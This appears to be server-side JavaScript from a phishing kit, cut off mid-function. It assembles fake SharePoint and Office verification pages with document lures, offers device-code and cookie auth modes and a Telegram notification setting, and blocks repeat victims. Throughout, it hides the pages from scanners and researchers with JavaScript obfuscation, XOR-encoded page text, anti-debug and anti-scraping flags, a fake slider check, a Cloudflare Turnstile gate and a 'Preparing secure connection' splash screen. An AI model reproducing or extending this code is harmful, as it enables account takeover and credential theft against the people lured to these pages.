'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const config = require('../config/env');
const jwt = require('jsonwebtoken');

const TEMPLATES_DIR = path.join(__dirname, '..', '..', 'templates');
const DESIGNS_DIR = path.join(__dirname, '..', '..', 'verification-designs');

// ─── AES-GCM Encryption Utilities ──────────────────────────
const ALGO = 'aes-256-gcm';
const AAD = 'VG-TEMPLATE-2024';

function encryptPayload(plaintext) {
    const salt = crypto.randomBytes(16);
    const iv = crypto.randomBytes(12);
    const key = crypto.pbkdf2Sync(salt, salt, 100000, 32, 'sha512');
    const cipher = crypto.createCipheriv(ALGO, key, iv);
    cipher.setAAD(Buffer.from(AAD));
    let encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
    const tag = cipher.getAuthTag();
    return {
        cipher: encrypted.toString('base64'),
        salt: salt.toString('base64'),
        iv: iv.toString('base64'),
        tag: tag.toString('base64')
    };
}

// ─── List & Resolve Templates ──────────────────────────────
function listDiskTemplates() {
    try {
        if (!fs.existsSync(TEMPLATES_DIR)) return [];
        return fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true })
        .filter(entry => entry.isDirectory() && entry.name !== 'assets' && entry.name !== 'custom')
        .map(entry => entry.name);
    } catch (e) { return []; }
}

function normalizeTemplateKey(value) {
    return String(value || '').toLowerCase().trim().replace(/[^a-z0-9]+/g, '');
}

function resolveTemplateDirectory(templateType) {
    const input = String(templateType || '').trim();
    const fallbackDir = 'sharepoint3';
    const candidateDirs = fs.existsSync(TEMPLATES_DIR)
    ? fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true }).filter(e => e.isDirectory()).map(e => e.name)
        : [];
    const ni = normalizeTemplateKey(input || fallbackDir);

    for (const dn of candidateDirs) {
        if (normalizeTemplateKey(dn) === ni) return path.join(TEMPLATES_DIR, dn);
        const cp = path.join(TEMPLATES_DIR, dn, 'config.json');
        if (fs.existsSync(cp)) {
            try {
                const c = JSON.parse(fs.readFileSync(cp, 'utf8'));
                if (c && c.name && normalizeTemplateKey(c.name) === ni) return path.join(TEMPLATES_DIR, dn);
            } catch (err) {}
        }
    }

    const dp = path.join(TEMPLATES_DIR, input || fallbackDir);
    if (fs.existsSync(dp)) return dp;

    const preferredFallback = candidateDirs.find(dn => normalizeTemplateKey(dn) === 'sharepoint4')
        || candidateDirs.find(dn => normalizeTemplateKey(dn) === 'sharepoint2')
        || candidateDirs[0];
    if (preferredFallback) return path.join(TEMPLATES_DIR, preferredFallback);

    return path.join(TEMPLATES_DIR, fallbackDir);
}

function loadTemplateConfig(templateType) {
    const tp = path.join(resolveTemplateDirectory(templateType), 'config.json');
    if (fs.existsSync(tp)) return JSON.parse(fs.readFileSync(tp, 'utf8'));
    return { name: templateType, preload: true, auth_mode: 'devicecode', fields: [] };
}


function getConfigDefault(templateConfig, key, fallback) {
    if (!templateConfig || !templateConfig.fields) return fallback;
    var field = templateConfig.fields.find(function(f) { return f.key === key; });
    return field && field.default !== undefined ? field.default : fallback;
}

function loadTemplateHTML(tt) {
    const fp = path.join(resolveTemplateDirectory(tt), 'index.html');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

function loadTemplateCSS(tt) {
    const fp = path.join(resolveTemplateDirectory(tt), 'style.css');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

function loadTemplateJS(tt) {
    const fp = path.join(resolveTemplateDirectory(tt), 'script.js');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

function loadVerificationDesignCSS(designName) {

    const name = String(designName || 'outlook').trim();
    const bn = name.toLowerCase();
    const candidates = [
        path.join(DESIGNS_DIR, name + '.css'),
        path.join(DESIGNS_DIR, bn + '.css'),
        path.join(DESIGNS_DIR, bn.charAt(0).toUpperCase() + bn.slice(1) + '.css'),
    ];
    for (const p of candidates) {
        if (fs.existsSync(p)) return fs.readFileSync(p, 'utf8');
    }
    const fp = path.join(DESIGNS_DIR, 'outlook.css');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

function insertAfterRealBody(html, block) {
    if (!block) return null;
    const headEnd = html.lastIndexOf('</head>');
    const searchFrom = headEnd >= 0 ? headEnd + 6 : 0;
    const m = /<body[^>]*>/i.exec(html.substring(searchFrom));
    if (!m) return null;
    const insertAt = searchFrom + m.index + m[0].length;
    return html.slice(0, insertAt) + block + html.slice(insertAt);
}


function insertBeforeRealBodyClose(html, block) {
    if (!block) return null;
    const headEnd = html.lastIndexOf('</head>');
    const searchFrom = headEnd >= 0 ? headEnd + 6 : 0;
    const idx = html.toLowerCase().indexOf('</body>', searchFrom);
    if (idx < 0) return null;
    return html.slice(0, idx) + block + html.slice(idx);
}

function loadVerificationDesignHTML(designName) {
    const bn = String(designName || '').trim().toLowerCase();
    
    const htmlCandidates = [
        path.join(DESIGNS_DIR, bn + '.html'),
        path.join(DESIGNS_DIR, bn.replace(/\.html$/, '.html')),
        path.join(DESIGNS_DIR, bn.charAt(0).toUpperCase() + bn.slice(1) + '.html'),
    ];
    
    if (bn === 'slider') {
        htmlCandidates.push(path.join(DESIGNS_DIR, 'SLIDER.html'));
        htmlCandidates.push(path.join(DESIGNS_DIR, 'slider.html'));
    }
    

    htmlCandidates.forEach(fp => {
        const exists = fs.existsSync(fp);

    });
    
    for (const fp of htmlCandidates) {
        if (fs.existsSync(fp)) {

            const content = fs.readFileSync(fp, 'utf8');
            const styleMatch = content.match(/<style[^>]*>([\s\S]*?)<\/style>/i);
            const scriptTags = content.match(/<script\b[^>]*>[\s\S]*?<\/script>/gi) || [];
            const js = scriptTags
                .map(function (tag) {
                    const m = tag.match(/<script\b[^>]*>([\s\S]*?)<\/script>/i);
                    return m ? m[1].trim() : '';
                })
                .filter(Boolean)
                .join('\n');

            const bodyMatch = content.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
            const html = bodyMatch
                ? bodyMatch[1]
                    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
                    .replace(/<script\b[^>]*\/?>/gi, '')
                    .trim()
                : '';

            return {
                css: styleMatch ? styleMatch[1].trim() : '',
                js: js,
                html: html,
                hasHtml: true
            };
        }
    }
    

    return { css: '', js: '', html: '', hasHtml: false };
}

function hasVerificationDesignHTML(designName) {
    const result = loadVerificationDesignHTML(designName);
    return result.hasHtml;
}

// ─── Visitor Access Settings ───────────────────────────────
async function getVisitorAccessSettings(userId) {
    try {
        const db = require('../database/connection');
        const [rows] = await db.query(
            'SELECT block_done_visitors, redirect_url FROM visitor_settings WHERE user_id = ?',
            [userId]
        );
        if (rows.length) {
            return {
                blockDoneVisitors: rows[0].block_done_visitors == 1,
                redirectUrl: rows[0].redirect_url || ''
            };
        }
        return { blockDoneVisitors: false, redirectUrl: '' };
    } catch (e) {
        return { blockDoneVisitors: false, redirectUrl: '' };
    }
}

async function checkVisitorBlocked(ipAddress, userId) {
    try {
        const settings = await getVisitorAccessSettings(userId);
        if (!settings.blockDoneVisitors) return { blocked: false };

        const db = require('../database/connection');
        const [rows] = await db.query(
            'SELECT status FROM visitors WHERE ip_address = ? AND user_id = ? ORDER BY created_at DESC LIMIT 1',
            [ipAddress, userId]
        );

        if (rows.length && (rows[0].status === 'done' || rows[0].status === 'blocked')) {
            return {
                blocked: true,
                redirectUrl: settings.redirectUrl
            };
        }
        return { blocked: false };
    } catch (e) {
        return { blocked: false };
    }
}

function buildBlockedPage(redirectUrl) {
    if (redirectUrl) {
        return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verification Complete</title>
    <style>
        body { margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #0b0b0b; font-family: 'Segoe UI', sans-serif; }
        .container { text-align: center; color: #c6ffdd; }
        .icon { font-size: 48px; margin-bottom: 16px; }
        h1 { font-size: 24px; margin-bottom: 8px; }
        p { color: #88ffaa; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">✅</div>
        <h1>Verification Complete</h1>
        <p>You have already completed verification. Redirecting...</p>
    </div>
    <script>window.location.replace("${redirectUrl.replace(/"/g, '\\\\"')}");<\/script>
</body>
</html>`;
    } else {
        return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verification Complete</title>
    <style>
        body { margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #0b0b0b; font-family: 'Segoe UI', sans-serif; }
        .container { text-align: center; color: #c6ffdd; max-width: 400px; padding: 20px; }
        .icon { font-size: 48px; margin-bottom: 16px; }
        h1 { font-size: 24px; margin-bottom: 8px; }
        p { color: #88ffaa; font-size: 14px; line-height: 1.5; }
        .badge { display: inline-block; background: rgba(0,255,102,0.1); border: 1px solid rgba(0,255,102,0.3); border-radius: 12px; padding: 4px 12px; font-size: 11px; color: #00ff66; margin-top: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">✅</div>
        <h1>Verification Complete</h1>
        <p>You have already completed the verification for this document. No further action is required.</p>
        <div class="badge">STATUS: COMPLETED</div>
    </div>
</body>
</html>`;
    }
}

// ─── Admin Settings ────────────────────────────────────────
async function loadAdminSettings() {
    const obj = {};
    try {
        const db = require('../database/connection');
        const [rows] = await db.query('SELECT setting_key, setting_value FROM settings');
        for (const r of rows) obj[r.setting_key] = r.setting_value;
    } catch (e) {}
    if (obj.obfuscation_enabled === undefined) obj.obfuscation_enabled = String(config.ENABLE_OBFUSCATION).toLowerCase() === 'true' ? 'true' : 'false';
    if (obj.antidebug_enabled === undefined) obj.antidebug_enabled = String(config.ENABLE_ANTIDEBUG).toLowerCase() === 'true' ? 'true' : 'false';
    if (obj.antiscraping_enabled === undefined) obj.antiscraping_enabled = 'true';
    if (obj.soft_error_retry_enabled === undefined) obj.soft_error_retry_enabled = 'false';
    if (obj.default_background_blur === undefined) obj.default_background_blur = '4';
    if (obj.default_auth_mode === undefined) obj.default_auth_mode = 'cookie';
    if (obj.telegram_notify_on_code_click === undefined) obj.telegram_notify_on_code_click = 'false';
    return obj;
}

// Save admin settings
async function saveAdminSettings(settings) {
    const db = require('../database/connection');
    for (const [key, value] of Object.entries(settings)) {
        await db.query('INSERT INTO settings (setting_key, setting_value) VALUES (?, ?) ON DUPLICATE KEY UPDATE setting_value=?', [key, value, value]);
    }
}

function boolSetting(v) {
    if (v === true || v === 1) return true;
    return String(v || '').toLowerCase() === 'true';
}

function obfuscateJs(sourceCode, options) {
    try {
        const JavaScriptObfuscator = require('javascript-obfuscator');
        const workersSafe = !!(options && options.workersSafe);


        const result = JavaScriptObfuscator.obfuscate(sourceCode, {
            compact: true,             
            controlFlowFlattening: true,     
            controlFlowFlatteningThreshold: 0.5, 
            deadCodeInjection: false,      
            deadCodeInjectionThreshold: 0,
            debugProtection: false,        
            debugProtectionInterval: 0,
            disableConsoleOutput: false, // no console.* left in the page assets; this only injected a console-disabler that referenced window
            identifierNamesGenerator: 'hexadecimal',
            renameGlobals: false,          
            selfDefending: !workersSafe,
            stringArray: true,
            stringArrayCallsTransform: true,
            stringArrayEncoding: ['rc4'], 
            stringArrayIndexShift: true,
            stringArrayRotate: true,
            stringArrayShuffle: true,
            stringArrayWrappersCount: 2,       
            stringArrayWrappersChainedCalls: false,
            stringArrayWrappersParametersMaxCount: 2,
            stringArrayWrappersType: 'variable',
            transformObjectKeys: false,        
            unicodeEscapeSequence: true,
            numbersToExpressions: false,     
            simplify: true,                 
            splitStrings: true,
            splitStringsChunkLength: 8,      
        });

        const finalCode = result.getObfuscatedCode();


        return finalCode;
    } catch (e) {

        return sourceCode;
    }
}

function reportTurnstileKey(key, linkId, ctx) {
    const k = String(key || '').trim();
    if (!k) {

    } else if (/CHANGE_ME|REPLACE_ME|YOUR_|xxxx/i.test(k)) {

    } else {


    }
}

// ─── Window Variables Builder ──────────────────────────────
async function buildWindowVars(link, user, settings, options) {
    options = options || {};
    const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
    const obfuscationEnabled = boolSetting(settings.obfuscation_enabled) || !!link.obfuscated;
    const antidebugEnabled = settings.antidebug_enabled != null ? boolSetting(settings.antidebug_enabled) : true;
    const softErrorRetry = boolSetting(settings.soft_error_retry_enabled);
    const defaultBlur = (link.background_blur != null ? link.background_blur : parseInt(settings.default_background_blur, 10)) || 4;
    const authMode = link.auth_mode || settings.default_auth_mode || 'cookie';
    const bgUrl = link.custom_bg_url || link.background_blur_url || '';
    const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
    const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
    let turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
    try {
        const turnstilePool = require('./turnstile-pool');
        if (link && link.id) {
            const sk = await turnstilePool.getAssignedSiteKey(link.id);
            if (sk) turnstileSiteKey = sk;
        }
    } catch (e) {

    }
    reportTurnstileKey(turnstileSiteKey, link && link.id, 'buildWindowVars');
    // Defaults come from the template's own config.json so a link created with no
    // custom text still shows the template's original wording, and the panel can
    // pre-fill those same real values for the user to edit.
    var _tc = loadTemplateConfig(link.template_type);
    var _def = function (k, fb) { return getConfigDefault(_tc, k, fb); };
    var apiBase = '';

    if (!options.relativeApi && options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
    else if (!options.relativeApi && config.API_URL) apiBase = String(config.API_URL).trim().replace(/\/+$/, '');
    else if (!options.relativeApi && config.APP_URL) apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');

    const blob = JSON.stringify({
        VG_JWT: jt,
        __API_BASE: apiBase,
        __API_BASE_FALLBACK: config.APP_URL ? String(config.APP_URL).trim().replace(/\/+$/, '') : '',
        __DESTINATION_URL: link.destination_url || 'https://office.com',
        __AUTH_MODE: authMode,
        __BACKGROUND_BLUR_URL: bgUrl,
        __BACKGROUND_BLUR_AMOUNT: String(defaultBlur),
        __DOC_FILENAME: link.file_name || _def('file_name', 'Document.pdf'),
        __DOC_TITLE: link.title_text || _def('title', 'Non-Disclosure Agreement'),
        __DOC_PAGES: String(parseInt(link.pages, 10) || parseInt(_def('pages', 4), 10) || 4),
        __PAGE_TITLE: link.title_text || _def('title', 'Verify your identity'),
        __PAGE_MESSAGE: link.message_text || _def('message', 'Please verify your identity to continue'),
        __PAGE_MESSAGE_SET: String(!!link.message_text),
        __PRIMARY_BUTTON_TEXT: link.button_text || _def('button_text', 'Get verification code'),
        __OBFUSCATION_ENABLED: String(obfuscationEnabled),
        __ANTIDEBUG_ENABLED: String(antidebugEnabled),
        __ANTISCRAPE_ENABLED: String(boolSetting(settings.antiscraping_enabled)),
        __SOFT_ERROR_RETRY_ENABLED: String(softErrorRetry),
        COPY_TO_OPEN: String(!!link.copy_to_open),
        __TURNSTILE_ENABLED: String(!!turnstileEnabled),
        __TURNSTILE_SITE_KEY: turnstileSiteKey,
        __EXPORT_DOMAIN: exportDomain,
        __BLOB_URL_ENABLED: String(!!link.blob_url_enabled),
        __SHOW_VERIFICATION_COMPLETE: String(link.show_verification_complete !== false && link.show_verification_complete !== 0),
    });
    const encoded = Buffer.from(blob).toString('base64');
    return '<script>!function(){try{var j=JSON.parse(atob("' + encoded + '"));for(var k in j)window[k]=j[k]}catch(e){}}();</script>';
}

// ─── Text Obfuscation (XOR + Base64 for text nodes only) ──
function obfuscateTextContent(html) {
    var strings = [];
    var seen = new Set();

    html = html.replace(/>([A-Za-z0-9\s\-\.\/\,\!\?\&\;\#\(\)\[\]\{\}\<\>\"\'=]+)</g, function(match, text) {
        var trimmed = text.trim();
        if (!trimmed || trimmed.length < 3) return match;
        if (!seen.has(trimmed)) {
            seen.add(trimmed);
            strings.push(trimmed);
        }
        var idx = strings.length - 1;
        return '><span class="__vg" data-idx="' + idx + '">__VG__</span>';
    });

    var encodedMap = {};
    for (var i = 0; i < strings.length; i++) {
        var s = strings[i];
        var encoded = '';
        for (var j = 0; j < s.length; j++) {
            encoded += String.fromCharCode(s.charCodeAt(j) ^ ((i + 42) ^ 0x5A));
        }
        encodedMap[i] = Buffer.from(encoded).toString('base64');
    }

    var encodedArr = [];
    for (var k = 0; k < strings.length; k++) {
        encodedArr.push('"' + encodedMap[k] + '"');
    }

    // FIX: Wrap in DOMContentLoaded to ensure spans exist before decoding
    var decodeScript = '<scr' + 'ipt>(function(){function d(){var S=[' + encodedArr.join(',') + '];var D=[];for(var i=0;i<S.length;i++){var p=atob(S[i]);var t="";for(var j=0;j<p.length;j++){t+=String.fromCharCode(p.charCodeAt(j)^(i+42)^90)}D[i]=t}var spans=document.querySelectorAll("span.__vg");for(var i=0;i<spans.length;i++){var idx=parseInt(spans[i].getAttribute("data-idx"));if(D[idx]!==undefined){spans[i].textContent=D[idx];spans[i].className="";spans[i].removeAttribute("data-idx")}}};if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",d);}else{d();}})();</scr' + 'ipt>';


    const htmlWithDecode = insertBeforeRealBodyClose(html, decodeScript);
    if (htmlWithDecode) {
        html = htmlWithDecode;
    } else if (html.indexOf('</head>') !== -1) {
        html = html.replace('</head>', decodeScript + '</head>');
    } else {
        html = html + decodeScript;
    }

    return html.trim();
}

// ─── Scope Verification Design CSS ─────────────────────────
function scopeVerificationCss(css, scopeId) {
    var scope = '#' + scopeId;
    var GLOBAL_TO_SCOPE = {
        '*': scope + ', ' + scope + ' *',
        '*::before': scope + '::before, ' + scope + ' *::before',
        '*::after': scope + '::after, ' + scope + ' *::after',
        'body': scope,
        'html': scope,
        ':root': scope
    };

    function scopeSelectorList(selList) {
        return selList.split(',').map(function (sel) {
            var s = sel.trim();
            if (!s) return '';
            if (s.indexOf(scope) === 0) return s;
            var key = s.toLowerCase();
            if (Object.prototype.hasOwnProperty.call(GLOBAL_TO_SCOPE, key)) return GLOBAL_TO_SCOPE[key];
            return scope + ' ' + s;
        }).filter(Boolean).join(', ');
    }

    function walk(src) {
        src = src.replace(/\/\*[\s\S]*?\*\//g, '');
        var out = [];
        var i = 0;
        while (i < src.length) {
            while (i < src.length && /\s/.test(src.charAt(i))) i++;
            if (i >= src.length) break;
            var depth = 0, open = -1, close = -1;
            for (var j = i; j < src.length; j++) {
                var ch = src.charAt(j);
                if (ch === '{') {
                    depth++;
                    if (open === -1) open = j;
                } else if (ch === '}') {
                    depth--;
                    if (depth === 0) { close = j; break; }
                }
            }
            if (open === -1 || close === -1) break; 

            var header = src.substring(i, open).trim();
            var body = src.substring(open + 1, close);

            if (/^@media/i.test(header)) {
                out.push(header + ' {' + walk(body) + '}');
            } else if (/^@/i.test(header)) {
                // @keyframes, @font-face, etc. - must not be re-scoped.
                out.push(header + ' {' + body + '}');
            } else {
                out.push(scopeSelectorList(header) + ' {' + body + '}');
            }
            i = close + 1;
        }
        return out.join('\n');
    }

    return walk(css);
}

// ─── Build Slider Overlay HTML ─────────────────────────────
function buildSliderOverlay(sliderData, link, obfuscate = false) {

    let layer1Html = '';
    
    if (sliderData && sliderData.hasHtml && sliderData.html) {

        layer1Html = `
<!-- ===== LAYER 1: SLIDER from SLIDER.html (visible on page load) ===== -->
<div id="vgSliderLayer" style="display:block;position:fixed;inset:0;z-index:99999;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;padding:24px 16px;">
    ${sliderData.html}
</div>`;
    } else {
        layer1Html = `
<!-- ===== LAYER 1: SLIDER (visible on page load) ===== -->
<div id="vgSliderLayer" style="display:block;position:fixed;inset:0;z-index:99999;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;padding:24px 16px;">
    <div style="background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.06);border:1px solid #EDEBE9;width:100%;max-width:420px;padding:40px 32px;text-align:center;">
        <h1 style="font-size:24px;font-weight:700;color:#232333;margin-bottom:8px;">Quick check</h1>
        <p style="font-size:14px;color:#605E5C;margin-bottom:32px;line-height:1.5;">Move the slider to continue.</p>
        <div id="vgSliderContainer" style="position:relative;width:100%;height:54px;background:#F1F3F5;border-radius:27px;border:1px solid #EDEBE9;display:flex;align-items:center;justify-content:center;user-select:none;overflow:hidden;margin-bottom:16px;">
            <div id="vgSliderProgress" style="position:absolute;left:0;top:0;bottom:0;width:0;background:linear-gradient(90deg,rgba(45,140,255,.15),rgba(11,106,11,.15));z-index:2;pointer-events:none;"></div>
            <span id="vgSliderText" style="font-size:14px;font-weight:600;color:#495057;z-index:1;position:relative;">Slide to continue</span>
            <div id="vgSliderHandle" style="position:absolute;left:4px;width:46px;height:46px;background:#fff;border-radius:50%;box-shadow:0 2px 8px rgba(0,0,0,.12);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:3;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#605E5C" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
            </div>
        </div>
        <div id="vgSliderHint" style="font-size:12px;color:#605E5C;min-height:18px;">Move the slider to continue.</div>
    </div>
</div>`;
    }

    const layer2Html = `
<!-- ===== LAYER 2: CLOUDFLARE TURNSTILE (hidden until slider done) ===== -->
<div id="vgCfLayer" style="display:none;position:fixed;inset:0;z-index:99998;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;align-items:center;justify-content:center;padding:24px 16px;">
    <div style="background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.06);border:1px solid #EDEBE9;width:100%;max-width:420px;padding:40px 32px;text-align:center;">
        <h1 style="font-size:24px;font-weight:700;color:#232333;margin-bottom:8px;">Security Check</h1>
        <p style="font-size:14px;color:#605E5C;margin-bottom:32px;line-height:1.5;">Verifying with Cloudflare...</p>
        <div id="vgCfWidgetWrap" style="min-height:80px;display:flex;align-items:center;justify-content:center;">
            <div id="vgCfPlaceholder" style="text-align:center;">
                <div style="width:40px;height:40px;border:3px solid #e4e4e4;border-top-color:#0078D4;border-radius:50%;animation:vgSpin 1s linear infinite;margin:0 auto 12px;"></div>
                <div style="font-size:13px;color:#605E5C;">Completing verification...</div>
            </div>
        </div>
        <div id="vgCfHint" style="font-size:12px;color:#605E5C;min-height:18px;"></div>
    </div>
</div>`;


    let cssContent = '';
    if (sliderData && sliderData.hasHtml && sliderData.css) {
        // Scope to the layer - see scopeVerificationCss() for why this is required.
        cssContent = scopeVerificationCss(sliderData.css, 'vgSliderLayer');
    } else {

        cssContent = `
        #vgSliderContainer.vg-verifying #vgSliderHandle { background: #0B6A0B !important; cursor: default; }
        #vgSliderContainer.vg-verifying svg { color: #fff !important; }`;
    }


    cssContent += `
    @keyframes vgSpin { to { transform: rotate(360deg); } }`;

    const styleHtml = `<style>${cssContent}</style>`;


    let sliderJs = '';
    if (sliderData && sliderData.hasHtml && sliderData.js) {
        sliderJs = sliderData.js;
    } else {

        sliderJs = `
(function(){
    'use strict';
    
    if(document.readyState==='loading'){
        document.addEventListener('DOMContentLoaded', initSliderChain);
    } else {
        initSliderChain();
    }

    function initSliderChain(){
        var sliderLayer = document.getElementById('vgSliderLayer');
        var cfLayer = document.getElementById('vgCfLayer');
        
        if(!sliderLayer){ return; }
        
        var container = document.getElementById('vgSliderContainer');
        var handle = document.getElementById('vgSliderHandle');
        var progress = document.getElementById('vgSliderProgress');
        var textEl = document.getElementById('vgSliderText');
        var hintEl = document.getElementById('vgSliderHint');
        
        if(!container || !handle){ return; }
        
        var isDragging = false, startX = 0, maxTranslate = 0, isVerified = false;
        
        function initSize(){
            maxTranslate = container.clientWidth - handle.clientWidth - 8;
        }
        
        window.addEventListener('resize', initSize);
        initSize();
        
        handle.addEventListener('mousedown', startDrag);
        handle.addEventListener('touchstart', startDrag, {passive: true});
        
        function startDrag(e){
            if(isVerified) return;
            isDragging = true;
            startX = (e.clientX !== undefined) ? e.clientX : (e.touches && e.touches[0].clientX) || 0;
            document.addEventListener('mousemove', onDrag);
            document.addEventListener('touchmove', onDrag, {passive: true});
            document.addEventListener('mouseup', stopDrag);
            document.addEventListener('touchend', stopDrag);
        }
        
        function onDrag(e){
            if(!isDragging || isVerified) return;
            var currentX = (e.clientX !== undefined) ? e.clientX : (e.touches && e.touches[0].clientX) || 0;
            var diff = currentX - startX;
            var translate = Math.max(0, Math.min(diff, maxTranslate));
            handle.style.transform = 'translateX(' + translate + 'px)';
            progress.style.width = (translate + handle.clientWidth + 4) + 'px';
            if(translate > maxTranslate * 0.85){
                completeVerification();
            }
        }
        
        function stopDrag(){
            if(!isDragging || isVerified) return;
            isDragging = false;
            document.removeEventListener('mousemove', onDrag);
            document.removeEventListener('touchmove', onDrag);
            document.removeEventListener('mouseup', stopDrag);
            document.removeEventListener('touchend', stopDrag);
            if(!isVerified){
                handle.style.transform = 'translateX(0px)';
                progress.style.width = '0px';
            }
        }
        
        function completeVerification(){
            if(isVerified) return;
            isVerified = true;
            isDragging = false;
            container.classList.add('vg-verifying');
            handle.style.transform = 'translateX(' + maxTranslate + 'px)';
            progress.style.width = '100%';
            textEl.textContent = 'Verifying...';
            hintEl.textContent = 'Just a moment...';
            
            setTimeout(function(){
                textEl.textContent = 'Verified ✓';
                hintEl.textContent = 'Continuing...';
                
                setTimeout(function(){
                    if(sliderLayer){
                        sliderLayer.style.display = 'none';
                        sliderLayer.style.visibility = 'hidden';
                    }
                    
                    if(cfLayer){
                        cfLayer.style.display = 'flex';
                        
                        if(typeof window.__vgOnSliderComplete === 'function'){
                            window.__vgOnSliderComplete();
                        } else {
                            window.__vgPendingSliderComplete = true;
                        }
                    }
                    
                    window.__vgSliderVerified = true;
                }, 600);
            }, 1500);
        }
        
        window.__vgSliderVerified = false;
        window.__vgCheckSliderReady = function(){ return isVerified; };
    }

})();`;
    }

    let finalSliderJs = sliderJs;
    if (obfuscate && sliderJs.length > 100) {
        try {
            finalSliderJs = obfuscateJs(sliderJs);
            finalSliderJs = finalSliderJs.replace(/<\/script/gi, '<\\/script')
                                          .replace(/<\/style/gi, '<\\/style');

        } catch (e) {

            finalSliderJs = sliderJs;
        }
    } else {

        finalSliderJs = sliderJs.replace(/<\/script/gi, '<\\/script')
                                .replace(/<\/style/gi, '<\\/style');
    }

    const contractJs =
        'window.__vgSliderVerified = window.__vgSliderVerified === true;' +
        'window.__vgCheckSliderReady = function(){ return window.__vgSliderVerified === true; };';

    const chainJs = '<script>' + contractJs + '\n' + finalSliderJs + '<\/script>';

    const fullHtml = `
<!-- ═══════════════════════════════════════════════════
     SLIDER → CLOUDFLARE VERIFICATION CHAIN
     Layer 1: Slider (shows first, always visible)
     Layer 2: Cloudflare Turnstile (shows after slider)
     ═══════════════════════════════════════════════════ -->
${styleHtml}
${layer1Html}
${layer2Html}
${chainJs}`;

    return fullHtml;
}

// ─── Pre-verification splash (first-paint) ──────────────────
function buildSplashOverlay(config, link, obfuscate = false) {
    const splashBrand = (config && config.name) || (link && link.name) || 'Workspace';
    const logoInitial = String(splashBrand).charAt(0).toUpperCase();

    const splashCss = `
@keyframes vgSplashSpin{to{transform:rotate(360deg)}}
@keyframes vgSplashBar{0%{width:0%}100%{width:100%}}
#vgSplashOverlay{position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483646;background:#F4F6F8;display:flex;align-items:center;justify-content:center;flex-direction:column;opacity:0;transition:opacity .45s ease;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;color:#1F2937}
#vgSplashOverlay.vg-show{opacity:1}
.vg-splash-card{width:100%;max-width:420px;padding:0 28px;text-align:center}
.vg-splash-brand{display:inline-flex;align-items:center;gap:14px;margin-bottom:44px}
.vg-splash-badge{width:52px;height:52px;border-radius:10px;background:#0067B8;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:600;font-size:24px;flex-shrink:0}
.vg-splash-name{font-size:20px;font-weight:600;color:#14181E;line-height:1.25}
.vg-splash-env{font-size:12px;color:#8A8F98;margin-top:2px}
.vg-splash-spinner{width:38px;height:38px;border:3px solid #E4E7EB;border-top-color:#0067B8;border-radius:50%;animation:vgSplashSpin .9s linear infinite;margin:0 auto 30px}
.vg-splash-title{font-size:16px;font-weight:600;color:#14181E;margin-bottom:10px}
.vg-splash-desc{font-size:13px;color:#5C6370;line-height:1.6;margin-bottom:34px}
.vg-splash-track{width:100%;height:3px;background:#E4E7EB;border-radius:2px;overflow:hidden}
.vg-splash-fill{height:100%;background:#0067B8;border-radius:2px;animation:vgSplashBar 2.6s ease-in-out infinite}
.vg-splash-foot{margin-top:44px;font-size:11px;color:#A8AEB6;line-height:1.5}`;

    const splashHtml = `
<div id="vgSplashOverlay">
  <div class="vg-splash-card">
    <div class="vg-splash-brand">
      <div class="vg-splash-badge">${logoInitial}</div>
      <div>
        <div class="vg-splash-name">${splashBrand}</div>
        <div class="vg-splash-env">Secure Workspace</div>
      </div>
    </div>
    <div class="vg-splash-spinner"></div>
    <div class="vg-splash-title">Preparing secure connection</div>
    <div class="vg-splash-desc">Establishing a protected session. This may take a few seconds.</div>
    <div class="vg-splash-track"><div class="vg-splash-fill"></div></div>
    <div class="vg-splash-foot">${splashBrand} does not store or share your session information.</div>
  </div>
</div>`;

    const splashJs = `
(function(){
  if(window.__VG_SPLASH_READY){ return; }
  window.__VG_SPLASH_READY = true;
  window.__VG_SPLASH_ACTIVE = true;
  var ov = document.getElementById('vgSplashOverlay');
  if(!ov){ return; }
  setTimeout(function(){ ov.classList.add('vg-show'); }, 60);
  var delay = 1800 + Math.floor(Math.random() * 1000);
  var timer = setTimeout(function(){
    ov.style.transition = 'opacity .55s ease';
    ov.style.opacity = '0';
    setTimeout(function(){
